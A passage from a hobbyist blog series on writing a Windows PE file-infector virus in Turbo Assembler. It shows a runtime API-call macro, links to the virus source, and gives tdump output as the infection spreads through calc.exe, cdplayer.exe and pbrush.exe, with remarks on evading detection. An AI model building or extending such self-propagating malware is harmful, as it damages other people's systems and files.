</span></span></code></pre></td></tr></table></div></div><h2 id=call_runtime_api>CALL_RUNTIME_API <a href=#call_runtime_api class=anchor>üîó</a></h2><p>The last macro is the one used to invoke functions previously described with <code>DESC_RUNTIME_API</code> and declared with <code>REQUIRED_API</code>. The <code>LINK_API</code> macro uses <code>CALL_RUNTIME_API</code> to call <code>GetProcAddress</code>.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#75715e>; CALL_RUNTIME_API is a macro that calls a given API previously setup</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; with REQUIRED_API, DESC_RUNTIME_API and LINK_API. The given reg will</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; be used as a scratch register to load the address of the API to call.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; If none is provided, edx is used.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; </span>
</span></span><span style=display:flex><span><span style=color:#75715e>; e.g.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;   CALL_RUNTIME_API GetProcAddress, &lt;ebx,ecx&gt;, eax</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; would result in:</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>;   The address of GetProcAddress being put into eax, and called with the </span>
</span></span><span style=display:flex><span><span style=color:#75715e>;   arguments ebx and ecx.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>; </span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>CALL_RUNTIME_API</span> MACRO name:REQ, args, reg:<span style=color:#f92672>=&lt;</span>edx<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> <span style=color:#f92672>&amp;</span>reg, [<span style=color:#f92672>&amp;</span>name]
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>call</span> (type proc<span style=color:#f92672>&amp;</span>name) PTR <span style=color:#f92672>&amp;</span>reg, <span style=color:#f92672>&amp;</span>args
</span></span><span style=display:flex><span><span style=color:#66d9ef>END</span>M
</span></span></code></pre></td></tr></table></div></div><h1 id=next-steps>Next Steps <a href=#next-steps class=anchor>üîó</a></h1><p>With <code>apifind</code> and <code>apifind2</code> I have an effective way to find <code>kernel32.dll</code> and its exported functions at runtime without hard-coding anything. The next step is to take this code and integrate it back into the <code>pijector</code> virus code.</p><p>For this I created a project called <code>apisafejector</code>. Like the other projects so far its code is available <a href=https://github.com/cpu/vexation/tree/master/apisafejector target=_blank rel=noopener>in the VeXation repo</a>.</p><p>I was able to use the code/macros from <code>apifind2</code> for <code>apisafejector</code> as-is with one small exception: all of the variable references needed to be adjusted to use the <a href=../delta-offset>delta offset</a>.</p><p>For each of the Win32 APIs used by <code>pijector</code> the <code>apisafejector</code> code needed:</p><ol><li>a <code>DESC_RUNTIME_API</code> line. See <a href=https://github.com/cpu/vexation/blob/master/apisafejector/apisafejector.inc target=_blank rel=noopener><code>apisafejector.inc</code></a> for these.</li><li>a <code>REQUIRED_API</code> line. See <a href=https://github.com/cpu/vexation/blob/8c24ef87338b5b2558def7866cebc37d37a4e4ec/apisafejector/apisafejector.asm#L583-L603 target=_blank rel=noopener>the bottom of <code>apisafejector.asm</code></a> for these.</li><li>a <code>LINK_API</code> line. See <a href=https://github.com/cpu/vexation/blob/8c24ef87338b5b2558def7866cebc37d37a4e4ec/apisafejector/apisafejector.asm#L165-L181 target=_blank rel=noopener>the <code>@@linkapis</code> label in <code>apisafejector.asm</code></a>.</li></ol><p>After these three pieces were in place I updated each of the existing <code>call &lt;win32 api function>, &lt;args></code> instructions to use <code>CALL_RUNTIME_API &lt;win32 api function>, &lt;args></code> instead.</p><h1 id=a-virus-at-last>A virus at last! <a href=#a-virus-at-last class=anchor>üîó</a></h1><p>It&rsquo;s finally time to see if the virus code can propagate itself beyond the first generation. To test the updated <code>apisafejector</code> virus I started by infecting <code>calc.exe</code> by using the <code>Makefile</code>&rsquo;s run target with a clean build (without debug symbols):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bat data-lang=bat><span style=display:flex><span>make clean
</span></span><span style=display:flex><span>make
</span></span><span style=display:flex><span>make run
</span></span></code></pre></div><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.apisafe.gen0.1.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.apisafe.gen0.1_hu553632a424ae4a37729f2ae7946d6d83_28832_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.apisafe.gen0.1_hu553632a424ae4a37729f2ae7946d6d83_28832_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.apisafe.gen0.1_hu553632a424ae4a37729f2ae7946d6d83_28832_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Debugging apisafejector" title="TD32 Debugging apisafejector" src=td32.apisafe.gen0.1.png loading=lazy class=img-fluid></picture></a><figcaption>Debugging generation 0 of apisafejector.exe</figcaption></figure></p></p><p>This launched <code>apisafejector.exe</code> in <code>td32</code> (remember it&rsquo;s a necessary hack to run the generation 0 executable this way or it will crash writing to a read-only section). Hitting <code>F9</code> lets it complete its work infecting the only other <code>.exe</code> in the directory that can be opened for writing, <code>calc.exe</code>. The <code>apisafejector.exe</code> process terminates normally once it was complete.</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.apisafe.gen0.2.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.apisafe.gen0.2_hu12403453f1a0ff8ca1865a66d4a106d9_33397_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.apisafe.gen0.2_hu12403453f1a0ff8ca1865a66d4a106d9_33397_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.apisafe.gen0.2_hu12403453f1a0ff8ca1865a66d4a106d9_33397_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Process terminated" title="TD32 Process terminated" src=td32.apisafe.gen0.2.png loading=lazy class=img-fluid></picture></a><figcaption>Process terminated.</figcaption></figure></p></p><p>I verified <code>calc.exe</code> was infected by checking the <code>tdump calc.exe</code> output to see that the entrypoint was updated and that there was a new <code>.ireloc</code> section added.</p><p>Before <code>tdump calc.exe</code> showed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>Entry RVA                0000534E
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Object table:
</span></span><span style=display:flex><span>#   Name      VirtSize    RVA     PhysSize  Phys off  Flags   
</span></span><span style=display:flex><span>--  --------  --------  --------  --------  --------  --------
</span></span><span style=display:flex><span>01  .text     000096B0  00001000  00009800  00000400  60000020 [CER]
</span></span><span style=display:flex><span>02  .bss      0000094C  0000B000  00000000  00000000  C0000080 [URW]
</span></span><span style=display:flex><span>03  .data     00001700  0000C000  00001800  00009C00  C0000040 [IRW]
</span></span><span style=display:flex><span>04  .idata    00000B64  0000E000  00000C00  0000B400  40000040 [IR]
</span></span><span style=display:flex><span>05  .rsrc     000015CC  0000F000  00001600  0000C000  40000040 [IR]
</span></span><span style=display:flex><span>06  .reloc    00001040  00011000  00001200  0000D600  42000040 [IDR]
</span></span></code></pre></div><p>After:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>Entry RVA                00013000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Object table:
</span></span><span style=display:flex><span>#   Name      VirtSize    RVA     PhysSize  Phys off  Flags
</span></span><span style=display:flex><span>--  --------  --------  --------  --------  --------  --------
</span></span><span style=display:flex><span>01  .text     000096B0  00001000  00009800  00000400  60000020 [CER]
</span></span><span style=display:flex><span>02  .bss      0000094C  0000B000  00000000  00000000  C0000080 [URW]
</span></span><span style=display:flex><span>03  .data     00001700  0000C000  00001800  00009C00  C0000040 [IRW]
</span></span><span style=display:flex><span>04  .idata    00000B64  0000E000  00000C00  0000B400  40000040 [IR]
</span></span><span style=display:flex><span>05  .rsrc     000015CC  0000F000  00001600  0000C000  40000040 [IR]
</span></span><span style=display:flex><span>06  .reloc    00001040  00011000  00001200  0000D600  42000040 [IDR]
</span></span><span style=display:flex><span>07  .ireloc   00001000  00013000  00000A00  0000E800  E0000020 [CERW]
</span></span></code></pre></div><p>Since the virus only infects <code>*.exe</code> files in the same directory it&rsquo;s easy to make a little test lab to see if the first generation <code>calc.exe</code> infection is working. I simply made a new directory, copied in the infected <code>calc.exe</code> and then copied in a clean <code>cdplayer.exe</code> from the Windows directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bat data-lang=bat><span style=display:flex><span><span style=color:#66d9ef>mkdir</span> test
</span></span><span style=display:flex><span><span style=color:#66d9ef>cd</span> test
</span></span><span style=display:flex><span><span style=color:#66d9ef>copy</span> ..\calc.exe
</span></span><span style=display:flex><span><span style=color:#66d9ef>copy</span> c:\windows\cdplayer.exe
</span></span></code></pre></div><p>Running <code>calc.exe</code> in this directory appears to do nothing: since the virus code doesn&rsquo;t call the original <code>calc.exe</code> entrypoint yet the program immediately exits after infecting <code>cdplayer.exe</code> and without showing any actual calculator GUI.</p><p>Checking the <code>tdump</code> output from <code>cdplayer.exe</code> shows that while it seemed like <code>calc.exe</code> exited without doing anything the infection did work! The entrypoint of <code>cdplayer.exe</code> was changed and a new <code>.ireloc</code> section was added. The generation 1 <code>calc.exe</code> managed to successfully create a generation 2 infection in <code>cdplayer.exe</code>!</p><p>Before running the infected <code>calc.exe</code> <code>tdump cdplayer.exe</code> showed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>Entry RVA                0000DE00
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Object table:
</span></span><span style=display:flex><span>#   Name      VirtSize    RVA     PhysSize  Phys off  Flags
</span></span><span style=display:flex><span>--  --------  --------  --------  --------  --------  --------
</span></span><span style=display:flex><span>01  .text     0000CFC0  00001000  0000D000  00000400  60000020 [CER]
</span></span><span style=display:flex><span>02  .sdata    00000004  0000E000  00000200  0000D400  D0000040 [ISRW]
</span></span><span style=display:flex><span>03  .data     00000C10  0000F000  00000E00  0000D600  C0000040 [IRW]
</span></span><span style=display:flex><span>04  .idata    0000135C  00010000  00001400  0000E400  40000040 [IR]
</span></span><span style=display:flex><span>05  .CRT      00000014  00012000  00000200  0000F800  C0000040 [IRW]
</span></span><span style=display:flex><span>06  .rsrc     00004618  00013000  00004800  0000FA00  40000040 [IR]
</span></span><span style=display:flex><span>07  .reloc    000014F4  00018000  00001600  00014200  42000040 [IDR]
</span></span></code></pre></div><p>After it showed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>Entry RVA                0001A000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Object table:
</span></span><span style=display:flex><span>#   Name      VirtSize    RVA     PhysSize  Phys off  Flags
</span></span><span style=display:flex><span>--  --------  --------  --------  --------  --------  --------
</span></span><span style=display:flex><span>01  .text     0000CFC0  00001000  0000D000  00000400  60000020 [CER]
</span></span><span style=display:flex><span>02  .sdata    00000004  0000E000  00000200  0000D400  D0000040 [ISRW]
</span></span><span style=display:flex><span>03  .data     00000C10  0000F000  00000E00  0000D600  C0000040 [IRW]
</span></span><span style=display:flex><span>04  .idata    0000135C  00010000  00001400  0000E400  40000040 [IR]
</span></span><span style=display:flex><span>05  .CRT      00000014  00012000  00000200  0000F800  C0000040 [IRW]
</span></span><span style=display:flex><span>06  .rsrc     00004618  00013000  00004800  0000FA00  40000040 [IR]
</span></span><span style=display:flex><span>07  .reloc    000014F4  00018000  00001600  00014200  42000040 [IDR]
</span></span><span style=display:flex><span>08  .ireloc   00001000  0001A000  00000A00  00015800  E0000020 [CERW]
</span></span></code></pre></div><p>To ensure this wasn&rsquo;t a fluke I tried making one more test directory to see if the generation 2 infection in <code>cdplayer.exe</code> could propagate.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bat data-lang=bat><span style=display:flex><span><span style=color:#66d9ef>mkdir</span> test2
</span></span><span style=display:flex><span><span style=color:#66d9ef>cd</span> test2
</span></span><span style=display:flex><span><span style=color:#66d9ef>copy</span> ..\cdplayer.exe
</span></span><span style=display:flex><span><span style=color:#66d9ef>copy</span> c:\windows\pbrush.exe
</span></span></code></pre></div><p>Running the infected <code>cdplayer.exe</code> gave the same results as <code>calc.exe</code>. The program exited immediately and the <code>tdump</code> output for the <code>pbrush.exe</code> program shows the tell-tale signs of infection. Generation 2 successfully propagated to generation 3 in <code>pbrush.exe</code>!</p><p>Before running <code>cdplayer.exe</code> <code>tdump pbrush.exe</code> showed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>Entry RVA                0000100C
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Object table:
</span></span><span style=display:flex><span>#   Name      VirtSize    RVA     PhysSize  Phys off  Flags
</span></span><span style=display:flex><span>--  --------  --------  --------  --------  --------  --------
</span></span><span style=display:flex><span>01  .text     000000AB  00001000  00000200  00000400  60000020 [CER]
</span></span><span style=display:flex><span>02  .idata    000000E4  00002000  00000200  00000600  40000040 [IR]
</span></span><span style=display:flex><span>03  .rsrc     0000071C  00003000  00000800  00000800  40000040 [IR]
</span></span><span style=display:flex><span>04  .reloc    00000034  00004000  00000200  00001000  42000040 [IDR]
</span></span></code></pre></div><p>After it showed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>Entry RVA                00005000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Object table:
</span></span><span style=display:flex><span>#   Name      VirtSize    RVA     PhysSize  Phys off  Flags
</span></span><span style=display:flex><span>--  --------  --------  --------  --------  --------  --------
</span></span><span style=display:flex><span>01  .text     000000AB  00001000  00000200  00000400  60000020 [CER]
</span></span><span style=display:flex><span>02  .idata    000000E4  00002000  00000200  00000600  40000040 [IR]
</span></span><span style=display:flex><span>03  .rsrc     0000071C  00003000  00000800  00000800  40000040 [IR]
</span></span><span style=display:flex><span>04  .reloc    00000034  00004000  00000200  00001000  42000040 [IDR]
</span></span><span style=display:flex><span>05  .ireloc   00001000  00005000  00000A00  00001200  E0000020 [CERW]
</span></span></code></pre></div><p>I have to admit I took particular joy in corrupting my favourite Windows utilities one by one.</p><h1 id=conclusion>Conclusion <a href=#conclusion class=anchor>üîó</a></h1><p>With <code>apisafejector</code> I&rsquo;ve arrived at a from-scratch Borland Turbo Assembler PE infector virus that actually propagates itself. The last remaining challenge before a rough prototype of the core virus is complete is finding a way to invoke the infected program&rsquo;s original code. If all of the infected programs appear to be broken then the virus certainly won&rsquo;t evade detection for long.</p><p>I hope presenting my progress and general piece-wise development approach is interesting! I&rsquo;ve only scratched the surface of what&rsquo;s possible and implemented the most basic techniques to keep making forward progress. I&rsquo;m excited to gradually improve on the skeleton established so far. If nothing else this project has emphasized for me the difference between knowing how to do something in theory and actually doing it in practice :-)</p><p>In general it seems like I manage ~one post a month so I hope to see you in May for the next VeXation installment. As always, I would love to hear feedback about this project. Feel free to drop me a line on twitter (<a href=https://twitter.com/cpu target=_blank rel=noopener>@cpu</a>) or by email (<a href=mailto://daniel@binaryparadox.net>daniel@binaryparadox.net</a>).</p></div><nav class=bottom_nav><ul><li style=flex:1><a rel=prev href=https://log.vexation.ca/2019/03/delta-offsets/>‚Üê Delta Offsets</a></li><li style="flex:1 0 80px;text-align:center"><button onclick="document.body.scrollTop=0,document.documentElement.scrollTop=0,event.preventDefault()">
‚Üë Back to top</button></li><li style=flex:1><a href=https://log.vexation.ca/2019/08/dont-be-suspicious/>Don't be suspicious ‚Üí</a></li></ul></nav></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/cpu/vexation rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a><a class=symbol href=https://twitter.com/cpu rel=me target=_blank><svg fill="#bbb" width="28" height="28" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="438.536" height="438.536" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536"><g><path d="M414.41 24.123C398.333 8.042 378.963.0 356.315.0H82.228C59.58.0 40.21 8.042 24.126 24.123 8.045 40.207.003 59.576.003 82.225v274.084c0 22.647 8.042 42.018 24.123 58.102 16.084 16.084 35.454 24.126 58.102 24.126h274.084c22.648.0 42.018-8.042 58.095-24.126 16.084-16.084 24.126-35.454 24.126-58.102V82.225C438.532 59.576 430.49 40.204 414.41 24.123zM335.471 168.735c.191 1.713.288 4.278.288 7.71.0 15.989-2.334 32.025-6.995 48.104-4.661 16.087-11.8 31.504-21.416 46.254-9.606 14.749-21.074 27.791-34.396 39.115-13.325 11.32-29.311 20.365-47.968 27.117-18.648 6.762-38.637 10.143-59.953 10.143-33.116.0-63.76-8.952-91.931-26.836 4.568.568 9.329.855 14.275.855 27.6.0 52.439-8.565 74.519-25.7-12.941-.185-24.506-4.179-34.688-11.991-10.185-7.803-17.273-17.699-21.271-29.691 4.947.76 8.658 1.137 11.132 1.137 4.187.0 9.042-.76 14.56-2.279-13.894-2.669-25.598-9.562-35.115-20.697-9.519-11.136-14.277-23.84-14.277-38.114v-.571c10.085 4.755 19.602 7.229 28.549 7.422-17.321-11.613-25.981-28.265-25.981-49.963.0-10.66 2.758-20.747 8.278-30.264 15.035 18.464 33.311 33.213 54.816 44.252 21.507 11.038 44.54 17.227 69.092 18.558-.95-3.616-1.427-8.186-1.427-13.704.0-16.562 5.853-30.692 17.56-42.399 11.703-11.706 25.837-17.561 42.394-17.561 17.515.0 32.079 6.283 43.688 18.846 13.134-2.474 25.892-7.33 38.26-14.56-4.757 14.652-13.613 25.788-26.55 33.402 12.368-1.716 23.88-4.95 34.537-9.708C357.458 149.793 347.462 160.166 335.471 168.735z"/></g></svg></a></div><div class=copyright>¬© Copyright
2022
<span class=split><a style=text-decoration:none;color:currentColor;cursor:not-allowed href=https://monkeypunch.biz>‚ò†</a></span>
Daniel McCarney</div></footer></body></html>